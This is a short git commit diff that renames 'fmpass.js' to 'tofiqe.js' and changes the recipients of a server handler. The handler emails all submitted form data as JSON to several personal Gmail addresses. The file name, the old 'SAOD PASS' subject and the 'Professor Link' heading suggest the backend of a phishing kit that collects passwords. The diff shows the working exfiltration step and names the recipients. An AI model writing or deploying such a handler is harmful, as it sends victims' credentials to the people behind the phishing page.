6133baaeadce8b578b9da6ebafd44c6ee4311c8e
linkquarry-hub <linkquarry@gmail.com>
2025-12-13 10:20:12 +0500

    Update and rename fmpass.js to tofiqe.js

--- tofiqe.js
+++ tofiqe.js
@@ -38,8 +38,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,businessmehta383@gmail.com",
-      subject: "SAOD PASS",
+      to: "newzatpage@gmail.com,submitdispute@gmail.com,tufaiqueahmed@gmail.com",
+      subject: "Tofiqe",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
